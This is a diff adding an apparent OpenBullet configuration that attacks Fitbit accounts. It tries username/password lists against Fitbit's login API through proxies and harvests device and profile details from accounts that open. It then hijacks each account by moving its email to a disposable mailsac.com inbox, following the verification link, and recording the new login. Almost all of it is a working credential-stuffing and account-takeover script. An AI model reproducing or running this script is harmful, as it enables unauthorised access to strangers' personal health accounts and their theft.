@@ -1,0 +1,147 @@
+[SETTINGS]
+{
+  "Name": "Fitbit ",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-05T20:21:47.9464823+03:30",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://android-api.fitbit.com/oauth2/token" 
+  CONTENT "grant_type=password&client_id=2295XJ&username=<USER>&password=<PASS>&scope=activity%20heartrate%20location%20nutrition%20profile%20settings%20sleep%20social%20weight&expires_in=31536000" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+
+#UserID PARSE "<SOURCE>" LR "user_id\":\"" "\"" -> VAR "UserID" 
+
+#Token PARSE "<SOURCE>" LR "access_token\":\"" "\",\"" -> VAR "Token" 
+
+#Capture REQUEST GET "https://android-api.fitbit.com/1/user/<UserID>/devices.json?https://android-api.fitbit.com/1/user/<UserID>/devices.json" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+
+#Check KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "[]" 
+  KEYCHAIN Success OR 
+    KEY "\",\"batteryLevel\":" 
+
+#Device PARSE "<SOURCE>" LR "deviceVersion\":\"" "\",\"" -> CAP "Device" 
+
+#Device_Edition PARSE "<SOURCE>" LR ",\"deviceEdition\":\"" "\",\"" -> VAR "Device Edition" 
+
+FUNCTION ToUppercase "<Device Edition>" -> CAP "Device Edition" 
+
+#Last_Sync PARSE "<SOURCE>" LR "lastSyncTime\":\"" "T" -> CAP "Last Sync" 
+
+#Capture REQUEST GET "https://android-api.fitbit.com/1/user/<UserID>/profile.json?https://android-api.fitbit.com/1/user/<UserID>/profile.json" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+
+#Name PARSE "<SOURCE>" LR "fullName\":\"" "\"," -> CAP "Name" 
+
+#Joined PARSE "<SOURCE>" LR "memberSince\":\"" "\",\"" -> CAP "Joined" 
+
+#Verified PARSE "<SOURCE>" LR "emailVerificationRequired\":" ",\"" -> CAP "Verified" 
+
+FUNCTION Replace "false" "Yes" "<Verified>" -> CAP "Verified" 
+
+FUNCTION Replace "true" "No" "<Verified>" -> CAP "Verified" 
+
+#Random FUNCTION RandomString "?l?l?l?l?l?l?l" -> VAR "Random" 
+
+#Change_Email REQUEST POST "https://android-api.fitbit.com/1/account/change-email.json " 
+  CONTENT "email=<Random>@mailsac.com&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+
+KEYCHECK 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "youll need to wait " 
+  KEYCHAIN Success OR 
+    KEY "Click the verification link in the email" 
+
+#Wait FUNCTION Delay "5000" -> VAR "Wait" 
+
+#Get_Email REQUEST GET "https://mailsac.com/inbox/<Random>@mailsac.com" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#GetLink PARSE "<SOURCE>" LR "https://www.fitbit.com/verifyEmail/" "\"],\"" -> VAR "GetLink" 
+
+#ConfirmLink FUNCTION Translate 
+  KEY "verify?" VALUE "https://www.fitbit.com/verifyEmail/verify?" 
+  "<GetLink>" -> VAR "Link" 
+
+#Confirm_change REQUEST GET "<Link>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Parse_Mail PARSE "<Email>" LR "" "" -> CAP "Final Combo" 
+
+#Final_Mail FUNCTION Replace "<Email>" "<Random>@mailsac.com:<PASS>" "<Final Combo>" -> CAP "Final Combo" 
+
